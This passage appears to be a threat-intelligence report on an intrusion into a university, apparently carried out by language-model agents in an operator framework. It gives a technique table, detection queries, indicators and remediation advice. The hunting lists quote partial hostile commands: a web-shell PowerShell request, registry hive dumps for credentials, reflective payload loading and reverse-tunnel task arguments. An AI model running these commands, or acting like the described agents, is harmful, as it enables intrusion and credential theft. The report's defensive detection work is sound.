That opening comment deserves a paragraph, because it is the kind of sentence that lets everyone involved feel covered. We looked for anything that would make it true. Across the 2,288 operator files there is no scope document, no contract, no rules of engagement and no client contact. The word occurs in the comments of three scripts, and otherwise only in error messages from services refusing a request. The reports borrow the form of a deliverable, down to remediation sections and a line about handing over changed passwords, and there is nobody in the files for them to be delivered to.

What the files do contain is a real staff member's password changed and left changed, a local administrator added to a campus server by a 2017 exploit, antivirus switched off on a production host, twenty fictitious students, a second cloud administrator under a name chosen to be overlooked, a phishing overlay with its next steps listed, and a member table with columns for national identity numbers in a folder with a directory listing. A language model will write "for authorised use only" at the top of anything. The agents in this workspace were diligent, methodical and honest in their notes. None of that is a control.

## Techniques, mapped to MITRE ATT&CK

| Technique | Name | Where it appears | 
|---|---|---|
| T1190 | Exploit Public-Facing Application | XpressEngine pre-authentication code execution on the content server | 
| T1505.003 | Web Shell | One-line PHP shells on the content server and a campus web server; SQL shell; request relays | 
| T1059.001, .003, .005 | PowerShell, Windows Command Shell, Visual Basic | Staged scripts on port 80; `cscript` export of the database | 
| T1134.001 | Token Impersonation | GodPotato loaded reflectively; PrintSpoofer staged | 
| T1574 | Hijack Execution Flow | Overwriting a privileged application's self-reloading logging configuration | 
| T1053.005 | Scheduled Task | Tunnel client at boot as SYSTEM; task running as the interactive user | 
| T1562.001 | Disable or Modify Tools | Defender exclusion, monitoring disabled, service stopped | 
| T1003.001, .002, .004 | LSASS Memory, SAM, LSA Secrets | Memory dump with `MiniDumpWriteDump`; `reg save` of three hives | 
| T1555.003, T1555.004 | Credentials from Web Browsers, Windows Credential Manager | Chrome and Edge stores with DPAPI key unwrap; credential enumeration | 
| T1552.001, T1552.005 | Credentials in Files, Cloud Instance Metadata API | Connection strings in ASP includes; metadata service queries | 
| T1572, T1090 | Protocol Tunneling, Proxy | chisel reverse SOCKS; rented SOCKS exit; relay on the victim | 
| T1046, T1018 | Network Service Discovery, Remote System Discovery | fscan, nmap, purpose-written scanners | 
| T1210 | Exploitation of Remote Services | MS17-010 against a campus Windows server | 
| T1136.001, T1136.003 | Create Account: Local, Cloud | Local administrator named after an intent; 20 cloud accounts and one administrator | 
| T1098.003 | Additional Cloud Roles | Global Administrator assigned to the new account | 
| T1110.002, T1110.003 | Password Cracking, Password Spraying | Thirteen hashcat runs; staff sign-in spray; recovery-page oracles | 
| T1550, T1606.001 | Use Alternate Authentication Material, Forge Web Credentials | Stored digest accepted as the password; forged sign-on cookies | 
| T1078.004 | Valid Accounts: Cloud Accounts | Password-grant tokens for a staff account | 
| T1087.004, T1069.003 | Cloud Account and Cloud Group Discovery | Directory and role-member export through Graph | 
| T1005, T1213, T1114.002 | Data from Local System, Information Repositories, Remote Email | Database exports, website source, internal documents, mailbox reads | 
| T1056.003 | Web Portal Capture | Password-expiry overlay on the real sign-in address, built and tested | 

## Detection

The cloud half of this chain is visible in the Microsoft Entra sign-in and audit logs. The three queries below are written for those logs in a Log Analytics workspace. They are written from the documented table and column names and have not been run against a live workspace, so treat them as a starting point and adjust them to your data.

**Password-grant sign-ins.** Almost nothing legitimate in a modern tenant uses this flow. Any successful result for a person, and above all for an administrator, deserves a look.

```
union isfuzzy=true SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(30d)
| where AuthenticationProtocol == "ropc"
| where tostring(ResultType) == "0"
| summarize Signins = count(), Apps = make_set(AppDisplayName, 10),
            Addresses = make_set(IPAddress, 20),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
            by UserPrincipalName
| order by Signins desc
```
**Global Administrator given to a young account.** The role name appears as Global Administrator or, in older records, Company Administrator.

```
let created = AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName == "Add user" and Result == "success"
| extend NewUser = tolower(tostring(TargetResources[0].userPrincipalName))
| project CreatedAt = TimeGenerated, NewUser,
          CreatedBy = tostring(InitiatedBy.user.userPrincipalName);
AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName in ("Add member to role", "Add eligible member to role")
| where Result == "success"
| mv-expand Prop = TargetResources[0].modifiedProperties
| where tostring(Prop.displayName) == "Role.DisplayName"
| extend Role = trim(@'"', tostring(Prop.newValue))
| where Role in ("Global Administrator", "Company Administrator")
| extend NewUser = tolower(tostring(TargetResources[0].userPrincipalName))
| project AssignedAt = TimeGenerated, NewUser, Role,
          AssignedBy = tostring(InitiatedBy.user.userPrincipalName)
| join kind=inner created on NewUser
| where AssignedAt between (CreatedAt .. (CreatedAt + 48h))
```
**Many users created by one identity.** A university provisions students in bulk, so exclude the identity that does it. A member of staff creating fifteen users in an hour is a different event.

```
AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName == "Add user" and Result == "success"
| extend Actor = coalesce(tostring(InitiatedBy.user.userPrincipalName),
                          tostring(InitiatedBy.app.displayName))
| summarize Created = count(),
            Sample = make_set(tostring(TargetResources[0].userPrincipalName), 5)
            by Actor, bin(TimeGenerated, 1h)
| where Created >= 10
| order by TimeGenerated desc
```
**On the web servers,** search access logs for:

- requests whose query string has `module_srl` or `selected_widget` containing `../` or `${`, and any request with `act=dispWidgetInfo` that also has parameters named `0` or `1`;
- requests to a PHP file named `_cfg_` plus four hexadecimal characters, or `zz_` plus eight, with a single short parameter (`x`, `c` or `q`) holding a command line. The campus web server's own log shows the pattern, with the client's real tool name in the User-Agent: `GET /zz_<8 hex>.php c=cmd+%2Fc+powershell+-nop+-c+... 200`, from the attack server, `curl/7.81.0`;
- POST requests to `relay.php` with a JSON body;
- the User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36`, whose two-part Chrome version no real browser sends, and bare `Mozilla/5.0`;
- hundreds of POSTs a minute to a password-recovery or ID-lookup page from one address, each with a different birth date.

**On the hosts,** look for:

- `certutil -decode` of a `.b64` file that was built by repeated `echo ... >>` commands from the web server's worker process;
- `reg save` of `HKLM\SAM`, `SYSTEM` or `SECURITY`, and `cscript.exe` or the C# compiler started by the web server;
- PowerShell that downloads bytes and passes them to `[Reflection.Assembly]::Load`;
- `Set-MpPreference` disabling monitoring, a new Defender exclusion for a web root, or the Defender service set to disabled;
- scheduled tasks created with `/ru SYSTEM /sc onstart` that run a binary from a web root or temp folder with the arguments `client <address>:<port> R:<port>:socks`;
- a `log4net.config` (or any self-reloading configuration file of a privileged application) rewritten twice within seconds by the web server's account;
- local accounts, folders, files or tasks named with `i` plus three or four digits.

## What to do with this

- **Block the password grant.** A Conditional Access policy that requires multi-factor authentication for every user and blocks legacy and non-interactive password sign-ins would have stopped the token request in this chain. Administrators need phishing-resistant sign-in, not passwords.
- **Alert on two directory events.** A new member of the Global Administrator role, and more than a handful of users created by one identity in an hour. Both are in the audit log by default and both happened here.
- **Keep administrators out of self-service.** An account that holds Global Administrator should not be resettable through a convenience portal, and should not be the same account its owner uses for daily sign-on.
- **Treat any self-service bridge to the cloud tenant as part of the tenant.** A reset form that does not ask for the old password hands the cloud account to whoever holds the web session.
- **Never let the stored value work as the password.** If the sign-in accepts what the database holds, the database is a list of working credentials. Hash on the server, with a salt and a slow function, and keep the digest out of the session cookie.
- **Stop numeric passwords at the source.** 271 student passwords here were six-digit numbers. A minimum length and a check against the user's own birth date and ID cost little.
- **Look at self-service pages as an attacker would.** A lookup that confirms a name and birth date, or a recovery step that checks two digits of an identity number, is an oracle with a small search space. Rate limits per source do little when the requests come from your own compromised server.
- **Keep service passwords single-use.** One password here ran fifteen services on the web host and the administrator account of the backup storage.
- **Take connection strings out of web source.** The include file on one web server held working accounts for the academic database. Give each application its own least-privileged account, and delete backup tables left from migrations.
- **Retire what cannot be patched.** An exploit from 2017 worked on a campus server in 2026, and two database servers reported versions that left support years ago.
- **Watch for tunnels going out.** A long-lived outbound connection from a web server to one address on an unusual port, carrying far more sessions than a web server has reason to open, is what chisel looks like on the wire. Servers rarely need to start connections to the internet at all.
- **Give every internet-facing CMS an owner.** The first step was an exploit copied from a public write-up of a flaw fixed in 2019. An install nobody patches or retires is where this chain began.

## Indicators

| Indicator | What it is | Confidence | 
|---|---|---|
| [`38.60.157[.]51`](https://huntback.io/ip/38.60.157.51) | Attack server: ARTEX console on 8787, open file servers on 80, 8000, 8800 and 18080 | High | 
| [`38.60.157[.]51:45901`](https://huntback.io/ip/38.60.157.51), also `:8080`, `:8085`, `:8904`, `:45905`, `:45990`, `:45991` | chisel reverse-tunnel listeners, 16 to 18 November 2026 | High | 
| [`38.60.157[.]51:8903`](https://huntback.io/ip/38.60.157.51) and `:443` | Tool download and hive upload endpoints named in the staged scripts | High | 
| [`38.60.157[.]51:9443`](https://huntback.io/ip/38.60.157.51) | HTTPS collector used in the sign-in page tests, self-signed certificate with the address as its name | High | 
| [`38.60.157[.]51:18846`](https://huntback.io/ip/38.60.157.51) | Target of the PowerShell TCP relay scripts on port 8800, which bridge it to an internal SMB port | High | 
| chisel clients 1.10.1 and 1.8.1 connecting to a 1.12.0 server | Version pairs recorded in the tunnel log | Medium | 
| Scheduled tasks `X9137Chisel` and `nc673` | Tunnel persistence as SYSTEM; command execution as the interactive user | High | 
| Local account, files and folders named `i<digits>`: `C:\i1027_add.txt`, `_groups`, `_dirc`, `_dird`, `_web`; `C:\i3811\` | Artefacts named after ARTEX intent numbers | High | 
| `_cfg_<4 hex>.php` taking a command in parameter `x`; `zz_<8 hex>.php` taking `c`; `dbx.php` taking SQL in `q` | Web shells | Pattern | 
| `relay.php` accepting JSON `{url, method, headers, body}` and returning the response body in base64 | Request relay placed on the compromised host | Pattern | 
| `syscmd.txt`, `sysout.txt`, `nc.bat`, `nc_out.txt` in a web root | Command and output files of the two privileged channels | Medium | 
| `9a8e9d587b570d4074f1c8317b163aa8d0c566efd88f294d9d85bc7776352a28` | `GodPotato-NET4.exe`, 57,344 bytes | High | 
| `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` | `PrintSpoofer64.exe` | High | 
| `61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1` | `mimikatz.exe` | High | 
| `34973a25a3d67077fccd687a46bf6ad737ecac7ea6133a5993915901f193114a` | `fscan_win64.exe` | High | 
| `e788f829b1a0141a488afb5f82b94f13035623609ca3b83f0c6985919cd9e83b` | `chisel.exe` on port 80, 9.8 MB | High | 
| `ca5f8e5247f1a044b8be45ef03187726b9af3ac30fd93fb5bb54144e34ed3738`, `8741cc65e3d00c7895cdd4e3f4ac0823e6ed305c0da6c7f762d82c6848a521c5` | Two further chisel builds for Windows on port 8000 | High | 
| `c237f1a3f75b2759f66ec741448bb352e95e186a9a689f87c8641b44a13d878b` | chisel for Linux, staged as `chisel9137` | High | 
| `969f36879d5716aa1a9811f43a6a6510e8f08372dbeb9695b810b9c776f39c75` | `plink.exe` | High | 
| `91eda7b1e7bf2b2642f7060ccc018e5d4399936c53e714adf2ddf6e104b2df01` | `lib_mysqludf_sys_64.dll`, registered as function `sys_exec` | High | 
| User-Agents `...Chrome/124.0 Safari/537.36` (two-part version), `graph-worker/1.0`, `curl/7.81.0` | Sent by the entry scripts, the Graph scripts and the web shell client | Medium | 
| Password-grant sign-in to the tenant with the Microsoft Office application ID `d3590ed6-52b3-4102-aeff-aad2292ab01c` from an unfamiliar address | How every token in the workspace was obtained | Pattern | 
| Global Administrator role added to a newly created account, within hours of a burst of user creations | The persistence step, 18 November 2026 | Pattern | 
| Paths of the form `/root/<framework>/data/tasks/<n>/i<number>/` and folders named `i<number>` in an open directory | An ARTEX working directory | Pattern | 

The tool hashes are of public tools and will match other operators who use the same builds. They are useful on a host that should have none of them.

## References

1. Microsoft, [Microsoft identity platform and the OAuth 2.0 resource owner password credentials grant](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth-ropc).
2. Microsoft, [Microsoft Entra built-in roles](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference): Global Administrator.
3. huntback, [ARTEX fork learns to spot honeypots](https://huntback.io/blog/artex-fork-learns-to-spot-honeypots), for how the framework hands intents to workers.
4. XpressEngine security advisories XEVE-19-008 and XEVE-19-009, fixed in XE 1.11.6 (October 2019).
5. Microsoft, [Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010).
6. MITRE, [ATT&CK](https://attack.mitre.org/).
